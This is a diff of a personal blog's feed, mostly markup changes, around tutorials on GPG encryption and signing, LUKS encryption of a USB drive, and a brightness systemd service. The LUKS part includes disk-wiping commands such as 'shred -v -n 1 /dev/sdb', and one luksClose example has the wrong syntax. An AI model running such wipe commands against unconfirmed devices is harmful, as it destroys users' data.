+</span></span><span style="display:flex;"><span>8O31qQUgDCCbUnuvpW5pYJ2BconeNBHAZNKSKg+9U3DfCazRpky89be6W7WtjDGs
+</span></span><span style="display:flex;"><span>iFo5PEjBTvCJJXHvDgn2W7I7U0MWO220gyCT/Ja/eKad5GKTeMjOC4ERTwvha0ON 
+</span></span><span style="display:flex;"><span>-----END PGP PUBLIC KEY BLOCK-----
+</span></span></code></pre></div><ul>
 <li>Now, Charles can either put this Public Key on his website, and/or share it directly with someone. ie:<code>Jack</code></li>
 </ul>
 <p>  Here are the steps that Jack needs to take.</p>
 <ul>
 <li>After Jack saves the key he will need to import it into the keyring.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --import charles.gpg
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --import charles.gpg
+</span></span></code></pre></div><ul>
 <li>Confirm it was imported by listing the keys.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --list-keys
-</code></pre></div><ul>
-<li>This should show Jack&rsquo;s addition of Charles' key (Jack has not created any keys yet).</li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --list-keys
+</span></span></code></pre></div><ul>
+<li>This should show Jack&rsquo;s addition of Charles&rsquo; key (Jack has not created any keys yet).</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
-39B2BD6C93E1E63E8C004183FE91AF7A7B4EC267
-uid   <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> Charles &lt;charles@email.com&gt;
-sub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
-</code></pre></div><h2 id="step-3-encryption">Step 3: Encryption</h2>
-<p>  Jake now has Charles' Public Key in his key ring, so he is ready to create a message and encrypt it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>39B2BD6C93E1E63E8C004183FE91AF7A7B4EC267
+</span></span><span style="display:flex;"><span>uid   <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> Charles &lt;charles@email.com&gt;
+</span></span><span style="display:flex;"><span>sub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="step-3-encryption">Step 3: Encryption</h2>
+<p>  Jake now has Charles&rsquo; Public Key in his key ring, so he is ready to create a message and encrypt it.</p>
 <ul>
 <li>Jake will want to create a file that will contain a message, so we&rsquo;ll use the following echo command to create a file called <code>Jacks_plainmessage.txt</code>.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492&#34;</span> &gt; Jacks_plainmessage.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492&#34;</span> &gt; Jacks_plainmessage.txt
+</span></span></code></pre></div><ul>
 <li>
-<p>The next step is to use Charles' Public Key to encrypt <code>Jacks_plainmessage.txt</code>.</p>
+<p>The next step is to use Charles&rsquo; Public Key to encrypt <code>Jacks_plainmessage.txt</code>.</p>
 </li>
 <li>
 <p>We will use the following command:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --armor --output Jacks_encryptedmessage.txt --encrypt --recipient /
-charles@email.com Jacks_plainmessage.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --armor --output Jacks_encryptedmessage.txt --encrypt --recipient /
+</span></span><span style="display:flex;"><span>charles@email.com Jacks_plainmessage.txt
+</span></span></code></pre></div><ul>
 <li>
 <p><code>gpg</code>: The command to run GPG.</p>
 </li>
@@ -714,18 +901,18 @@ charles@email.com Jacks_plainmessage.txt
 <p>Run a preview command to illustrate the file has now been encrypted:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat Jacks_encryptedmessage.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat Jacks_encryptedmessage.txt
+</span></span></code></pre></div><ul>
 <li>The encrypted message should look like the following:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-----BEGIN PGP MESSAGE-----
-
-hQGMA1p4Le4c2oCaAQv+MT2ghzg9RYymSIxnbwe41LpOPx76mA9f6mQYZO77c/Ij
-u14kEgfaVM9PxxBw8KpEkg5NvmBVPAfxFbFrcLoKB8lVW8MTpp3mQ8r0257PNORK
-bQOC+HHktQN3AJrsgN/Oj4OduM+hMtnPUdWa0X7uOOKRFW9r5CbuYga134EzoHG3
-
------END PGP MESSAGE-----
-</code></pre></div><h2 id="step-4-decryption">Step 4: Decryption</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PGP MESSAGE-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hQGMA1p4Le4c2oCaAQv+MT2ghzg9RYymSIxnbwe41LpOPx76mA9f6mQYZO77c/Ij
+</span></span><span style="display:flex;"><span>u14kEgfaVM9PxxBw8KpEkg5NvmBVPAfxFbFrcLoKB8lVW8MTpp3mQ8r0257PNORK
+</span></span><span style="display:flex;"><span>bQOC+HHktQN3AJrsgN/Oj4OduM+hMtnPUdWa0X7uOOKRFW9r5CbuYga134EzoHG3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----END PGP MESSAGE-----
+</span></span></code></pre></div><h2 id="step-4-decryption">Step 4: Decryption</h2>
 <p>  The last step is for Jack to send his encrypted message over to Charles, so she can decrypt it with her Private Key.</p>
 <ul>
 <li>
@@ -735,8 +922,8 @@ bQOC+HHktQN3AJrsgN/Oj4OduM+hMtnPUdWa0X7uOOKRFW9r5CbuYga134EzoHG3
 <p>The command that Charles will use to decrypt Jack&rsquo;s encrypted message is:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --output Jacks_decrypted_message --decrypt Jacks_encryptedmessage.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --output Jacks_decrypted_message --decrypt Jacks_encryptedmessage.txt
+</span></span></code></pre></div><ul>
 <li>
 <p><code>gpg</code>: The command to run gpg.</p>
 </li>
@@ -753,21 +940,21 @@ bQOC+HHktQN3AJrsgN/Oj4OduM+hMtnPUdWa0X7uOOKRFW9r5CbuYga134EzoHG3
 <p>Preview the decrypted file by running:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat Jacks_decrypted_message
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat Jacks_decrypted_message
+</span></span></code></pre></div><ul>
 <li>This shows that now Charles can see Jack&rsquo;s plaintext message:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492.&#34;</span>
-</code></pre></div><h2 id="signing">Signing</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492.&#34;</span>
+</span></span></code></pre></div><h2 id="signing">Signing</h2>
 <p>  Signing with GPG gives the ability to verify that a file came from you or a specific person.<br>
 You can verify signature before extracting the data.</p>
 <p>Signing:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --sign text.txt
-</code></pre></div><p>Verifying:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --verify text.txt.gpg
-</code></pre></div><p>You can also have a detached signature file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --detach-sign text.txt
-</code></pre></div><p>  Then, you need to have both <code>text.txt</code> and <code>text.txt.sig</code> in the same directory and verify the signature with <code>gpg --verify text.txt.sig</code>.<br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --sign text.txt
+</span></span></code></pre></div><p>Verifying:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --verify text.txt.gpg
+</span></span></code></pre></div><p>You can also have a detached signature file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --detach-sign text.txt
+</span></span></code></pre></div><p>  Then, you need to have both <code>text.txt</code> and <code>text.txt.sig</code> in the same directory and verify the signature with <code>gpg --verify text.txt.sig</code>.<br>
 This part was just a quick overview of the signing.</p>
 <h1 id="windows">Windows</h1>
 <h2 id="step-1-setup">Step 1: Setup</h2>
@@ -904,8 +1091,8 @@ This part was just a quick overview of the signing.</p>
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/my_usb_encrypton_process/</guid>
             <description>LUKS USB Encryption for Linux Tutorial Written &amp;amp; Compiled by Jb Williams - @_binford - Github
 This is the process I use to partition and encrypt usb drives.
- I have not tested tested it on anything other than usb&amp;rsquo;s, though a similar process would potentially work.  !! Notice !! Running these commands on the wrong drive could Erase All Data on that Drive!!
- Only Recoverable if You Had a Backup Make sure you know:  Device Name(ie: /dev/sdb) Device Size(ie: 15GiB)    Reqs:</description>
+I have not tested tested it on anything other than usb&amp;rsquo;s, though a similar process would potentially work. !! Notice !! Running these commands on the wrong drive could Erase All Data on that Drive!!
+Only Recoverable if You Had a Backup Make sure you know: Device Name(ie: /dev/sdb) Device Size(ie: 15GiB) Reqs:</description>
             <content type="html"><![CDATA[<h1 id="luks-usb-encryption-for-linux">LUKS USB Encryption for Linux</h1>
 <p>Tutorial Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">Github</a></p>
 <p>This is the process I use to partition and encrypt usb drives.</p>
@@ -952,34 +1139,34 @@ This is the process I use to partition and encrypt usb drives.
 <code>/dev/sdb</code> - usb\</li>
 </ul>
 <p>to find device name:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lsblk
-</code></pre></div><p><em>example output</em>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
-sda      8:0    <span style="color:#ae81ff">0</span> 931.5G  <span style="color:#ae81ff">0</span> disk 
-|-sda1   8:1    <span style="color:#ae81ff">0</span>   100M  <span style="color:#ae81ff">0</span> part /boot
-|-sda2   8:2    <span style="color:#ae81ff">0</span>    53G  <span style="color:#ae81ff">0</span> part /
-|-sda3   8:3    <span style="color:#ae81ff">0</span>   293G  <span style="color:#ae81ff">0</span> part /home
-|-sda7   8:4    <span style="color:#ae81ff">0</span>     4G  <span style="color:#ae81ff">0</span> part <span style="color:#f92672">[</span>SWAP<span style="color:#f92672">]</span>
-|-sda5   8:5    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /tmp
-|-sda6   8:6    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /var
-sdb      8:12   <span style="color:#ae81ff">1</span>  14.7G  <span style="color:#ae81ff">0</span> disk 
-|-sdb1   8:13   <span style="color:#ae81ff">1</span>     4G  <span style="color:#ae81ff">0</span> part 
-<span style="color:#e6db74">`</span>-sdb2   8:14   <span style="color:#ae81ff">1</span>  10.5G  <span style="color:#ae81ff">0</span> part
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lsblk
+</span></span></code></pre></div><p><em>example output</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
+</span></span><span style="display:flex;"><span>sda      8:0    <span style="color:#ae81ff">0</span> 931.5G  <span style="color:#ae81ff">0</span> disk 
+</span></span><span style="display:flex;"><span>|-sda1   8:1    <span style="color:#ae81ff">0</span>   100M  <span style="color:#ae81ff">0</span> part /boot
+</span></span><span style="display:flex;"><span>|-sda2   8:2    <span style="color:#ae81ff">0</span>    53G  <span style="color:#ae81ff">0</span> part /
+</span></span><span style="display:flex;"><span>|-sda3   8:3    <span style="color:#ae81ff">0</span>   293G  <span style="color:#ae81ff">0</span> part /home
+</span></span><span style="display:flex;"><span>|-sda7   8:4    <span style="color:#ae81ff">0</span>     4G  <span style="color:#ae81ff">0</span> part <span style="color:#f92672">[</span>SWAP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|-sda5   8:5    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /tmp
+</span></span><span style="display:flex;"><span>|-sda6   8:6    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /var
+</span></span><span style="display:flex;"><span>sdb      8:12   <span style="color:#ae81ff">1</span>  14.7G  <span style="color:#ae81ff">0</span> disk 
+</span></span><span style="display:flex;"><span>|-sdb1   8:13   <span style="color:#ae81ff">1</span>     4G  <span style="color:#ae81ff">0</span> part 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-sdb2   8:14   <span style="color:#ae81ff">1</span>  10.5G  <span style="color:#ae81ff">0</span> part
+</span></span></code></pre></div><ul>
 <li>Then, if you wish you can switch user to <em>root</em>, we will be here. Also make double-check that the device is unmounted.<br>
 Remember USB is /dev/sdb.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">su - <span style="color:#f92672">&amp;&amp;</span> umount /dev/sdb
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su - <span style="color:#f92672">&amp;&amp;</span> umount /dev/sdb
+</span></span></code></pre></div><ul>
 <li>Next, before we partition and encrypt the drive, we will &ldquo;shred&rdquo; the data on the usb. This writes over the data that exists on it in an attempt destroy any recoverable data. It can be done a specified number of times.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">shred -v -n <span style="color:#ae81ff">1</span> /dev/sdb
-</code></pre></div><p>Where &ldquo;-v&rdquo; is verbose so you can monitor the progress, and &ldquo;-n 1&rdquo; is the number of iterations or number of times it should be overwitten. I have read anywhere between 1-7 is ok.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shred -v -n <span style="color:#ae81ff">1</span> /dev/sdb
+</span></span></code></pre></div><p>Where &ldquo;-v&rdquo; is verbose so you can monitor the progress, and &ldquo;-n 1&rdquo; is the number of iterations or number of times it should be overwitten. I have read anywhere between 1-7 is ok.</p>
 <h3 id="step-2">Step 2</h3>
 <p>At this point the data is clear on the usb and we will start partitioning and formatting the device. During this part you can create several partitions and encrypt and format then as you prefer.</p>
 <p>I will will go through this using <em>fdisk</em> and use the all the available space.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">fdisk /dev/sdb
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fdisk /dev/sdb
+</span></span></code></pre></div><ul>
 <li>&ldquo;o&rdquo; for DOS disklabel</li>
 <li>&ldquo;n&rdquo; to create new partition</li>
 <li>&ldquo;p&rdquo; set it as primary</li>
@@ -990,9 +1177,9 @@ Remember USB is /dev/sdb.</li>
 <ul>
 <li>if the following commands don&rsquo;t properly name the drive. after it&rsquo;s open you can open another terminal and either do <code>lsblk</code> to find the name of the drive, or <code>ls /dev/mapper/</code> and find the correct one.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cryptsetup luksOpen /dev/sdb1 &lt;desired_drive_name&gt;
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cryptsetup luksOpen /dev/sdb1 ENCRYPTED
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksOpen /dev/sdb1 &lt;desired_drive_name&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksOpen /dev/sdb1 ENCRYPTED
+</span></span></code></pre></div><ul>
 <li>
 <p>It will ask for a Passphrase, make sure it is a strong complex passphrase.</p>
 </li>
@@ -1004,30 +1191,30 @@ Remember USB is /dev/sdb.</li>
 </li>
 </ul>
 <p>To format as EXT4:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkfs.ext4 /dev/mapper/LUKS0001 -L ENCRYPTED
-</code></pre></div><p>To format as FAT32:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkfs.vfat /dev/mapper/LUKS0001 -n ENCRYPTED
-</code></pre></div><p>To format as NTFS:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkfs.ntfs /dev/mapper/LUKS0001 -L ENCRYPTED
-</code></pre></div><p>Finally, close the partition:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cryptsetup luksClose &lt;desired_drive_name&gt;
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cryptsetup luksClose /dev/sdb1 ENCRYPTED
-</code></pre></div><p>Now it is fine to get back to the regular user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.ext4 /dev/mapper/LUKS0001 -L ENCRYPTED
+</span></span></code></pre></div><p>To format as FAT32:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.vfat /dev/mapper/LUKS0001 -n ENCRYPTED
+</span></span></code></pre></div><p>To format as NTFS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.ntfs /dev/mapper/LUKS0001 -L ENCRYPTED
+</span></span></code></pre></div><p>Finally, close the partition:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksClose &lt;desired_drive_name&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksClose /dev/sdb1 ENCRYPTED
+</span></span></code></pre></div><p>Now it is fine to get back to the regular user.</p>
 <h3 id="step-3">Step 3</h3>
 <p>Interacting with the drive through command-line.</p>
 <ul>
 <li>To open and mount the encrypted drive from the command line.</li>
 <li>best practice to run <code>lsblk</code> again to check device name.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">udiskie-mount /dev/sdb1 <span style="color:#f92672">&amp;&amp;</span> udiskie-mount /dev/mapper/&lt;encrypted_dev_name&gt;
-</code></pre></div><p>Then to unmount you just:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">udiskie-umount /dev/mapper/&lt;encrypted_dev_name&gt;
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-mount /dev/sdb1 <span style="color:#f92672">&amp;&amp;</span> udiskie-mount /dev/mapper/&lt;encrypted_dev_name&gt;
+</span></span></code></pre></div><p>Then to unmount you just:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-umount /dev/mapper/&lt;encrypted_dev_name&gt;
+</span></span></code></pre></div><ul>
 <li>If it was just and un-encrypted drive the commands would just be:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">udiskie-mount /dev/sdb1
-udiskie-umount /dev/sdb1
-</code></pre></div><p><em>written &amp; compiled by: jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-mount /dev/sdb1
+</span></span><span style="display:flex;"><span>udiskie-umount /dev/sdb1
+</span></span></code></pre></div><p><em>written &amp; compiled by: jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></em></p>
 ]]></content>
         </item>
         
@@ -1038,8 +1225,8 @@ udiskie-umount /dev/sdb1
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/brightxf/</guid>
             <description>Brightxf Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-  !! Run at Own Risk !!
- No issues have come from my use of these but that doesn&amp;rsquo;t mean there won&amp;rsquo;t be   I enjoy making/finding the most minimal gui and still be functional as a daily-driver(functional specifically to my needs). I tend to prefer cwm, a simple window manager, and sxhkd, used as a hot-key daemon, and I test my setup on several different laptops of different specs.</description>
+!! Run at Own Risk !!
+No issues have come from my use of these but that doesn&amp;rsquo;t mean there won&amp;rsquo;t be I enjoy making/finding the most minimal gui and still be functional as a daily-driver(functional specifically to my needs). I tend to prefer cwm, a simple window manager, and sxhkd, used as a hot-key daemon, and I test my setup on several different laptops of different specs.</description>
             <content type="html"><![CDATA[<h3 id="brightxf">Brightxf</h3>
 <p>Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams/brightxf">Github</a></p>
 <h1 id="heading"></h1>
@@ -1064,24 +1251,24 @@ udiskie-umount /dev/sdb1
 <p>As sudo(root), make a directory <em>/etc/startup</em> and copy <em>brightness_mod.sh</em> there.</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mkdir -p /etc/startup <span style="color:#f92672">&amp;&amp;</span> sudo cp /path/to/brightness_mod.sh /etc/startup
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mkdir -p /etc/startup <span style="color:#f92672">&amp;&amp;</span> sudo cp /path/to/brightness_mod.sh /etc/startup
+</span></span></code></pre></div><ul>
 <li>Also as sudo(root), and copy <em>brightness_mod.service</em> to <em>/etc/systemd/system/</em> .</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cp /path/to/brightness_mod.service /etc/systemd/system/
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp /path/to/brightness_mod.service /etc/systemd/system/
+</span></span></code></pre></div><ul>
 <li>Then run:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo systemctl enable brightness_mod.service <span style="color:#f92672">&amp;&amp;</span> sudo systemctl daemon-reload
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl enable brightness_mod.service <span style="color:#f92672">&amp;&amp;</span> sudo systemctl daemon-reload
+</span></span></code></pre></div><ul>
 <li>I also believe, with how I&rsquo;ve set it up, it needs a reboot.</li>
 </ul>
 <p>Then the commands are:</p>
